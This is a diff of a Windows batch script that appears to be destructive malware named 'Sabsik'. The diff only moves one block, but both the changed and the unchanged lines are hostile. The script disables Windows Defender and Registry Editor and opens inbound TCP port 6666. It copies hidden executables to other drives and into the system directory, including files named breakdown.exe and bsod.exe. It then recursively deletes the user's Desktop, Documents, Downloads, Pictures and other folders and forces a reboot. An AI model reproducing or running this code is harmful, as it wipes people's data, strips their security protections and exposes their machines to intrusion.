@@ -43,36 +43,6 @@ sc config WinDefend start= disabled
 sc stop WinDefend
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 
-:: copying/deleting files
-IF EXIST D: xcopy /h /y /r Edge.exe D: && mkdir "D:\assets" && attrib +h "D:\assets" /d && xcopy /h /y /r /s /i "assets" "D:\assets" /e
-IF EXIST E: xcopy /h /y /r Edge.exe E: && mkdir "E:\assets" && attrib +h "E:\assets" /d && xcopy /h /y /r /s /i "assets" "E:\assets" /e
-::IF EXIST F: xcopy /h /y /r Edge.exe F: && mkdir "F:\assets" && attrib +h "F:\assets" && xcopy /h /y /r /s /i "assets" "F:\assets" /e
-md "C:\Users\Default\Documents\Sabsik.exe"
-xcopy /h /y /r "assets\breakdown.exe" %SYSTEMROOT%
-attrib +h "C:\breakdown.exe"
-xcopy /h /y /r "assets\bsod.exe" %SYSTEMROOT%
-attrib +h "C:\bsod.exe"
-xcopy /h /y /r "assets\encrypted.jpg" "C:\Users\Default\Documents\Sabsik.exe"
-xcopy /h /y /r "assets\lockscreen.png" "C:\Users\Default\Documents\Sabsik.exe"
-rd "C:\Users\Public\Desktop" /s /q
-md "C:\Users\Public\Desktop"
-rd "%USERPROFILE%\Desktop" /s /q
-md "%USERPROFILE%\Desktop"
-rd "%USERPROFILE%\Contacts" /s /q
-rd "%USERPROFILE%\3D Objects" /s /q
-rd "%USERPROFILE%\Links" /s /q
-rd "%USERPROFILE%\Saved Games" /s /q
-rd "%USERPROFILE%\Searches" /s /q
-rd "%USERPROFILE%\Favorites" /s /q
-rd "%USERPROFILE%\Downloads" /s /q
-rd "%USERPROFILE%\Documents" /s /q
-rd "%USERPROFILE%\Pictures" /s /q
-rd "%USERPROFILE%\Videos" /s /q
-rd "%USERPROFILE%\Music" /s /q
-rd "%USERPROFILE%\My Documents" /s /q
-rd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\System Tools" /s /q
-::powershell -command ""
-
 :: open 6666 Port
 netsh advfirewall firewall add rule name="Sabsik" dir=in action=allow protocol=TCP localport=6666
 
@@ -148,6 +118,36 @@ REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\git_shell\comman
 REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\git_shell\command" /va /f
 :: disabling Registry Editor
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+:: copying/deleting files
+IF EXIST D: xcopy /h /y /r Edge.exe D: && mkdir "D:\assets" && attrib +h "D:\assets" /d && xcopy /h /y /r /s /i "assets" "D:\assets" /e
+IF EXIST E: xcopy /h /y /r Edge.exe E: && mkdir "E:\assets" && attrib +h "E:\assets" /d && xcopy /h /y /r /s /i "assets" "E:\assets" /e
+::IF EXIST F: xcopy /h /y /r Edge.exe F: && mkdir "F:\assets" && attrib +h "F:\assets" && xcopy /h /y /r /s /i "assets" "F:\assets" /e
+md "C:\Users\Default\Documents\Sabsik.exe"
+xcopy /h /y /r "assets\breakdown.exe" %SYSTEMROOT%
+attrib +h "C:\breakdown.exe"
+xcopy /h /y /r "assets\bsod.exe" %SYSTEMROOT%
+attrib +h "C:\bsod.exe"
+xcopy /h /y /r "assets\encrypted.jpg" "C:\Users\Default\Documents\Sabsik.exe"
+xcopy /h /y /r "assets\lockscreen.png" "C:\Users\Default\Documents\Sabsik.exe"
+rd "C:\Users\Public\Desktop" /s /q
+md "C:\Users\Public\Desktop"
+rd "%USERPROFILE%\Desktop" /s /q
+md "%USERPROFILE%\Desktop"
+rd "%USERPROFILE%\Contacts" /s /q
+rd "%USERPROFILE%\3D Objects" /s /q
+rd "%USERPROFILE%\Links" /s /q
+rd "%USERPROFILE%\Saved Games" /s /q
+rd "%USERPROFILE%\Searches" /s /q
+rd "%USERPROFILE%\Favorites" /s /q
+rd "%USERPROFILE%\Downloads" /s /q
+rd "%USERPROFILE%\Documents" /s /q
+rd "%USERPROFILE%\Pictures" /s /q
+rd "%USERPROFILE%\Videos" /s /q
+rd "%USERPROFILE%\Music" /s /q
+rd "%USERPROFILE%\My Documents" /s /q
+rd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\System Tools" /s /q
+::powershell -command ""
 
 :: Shutdown
 shutdown /r /t 00
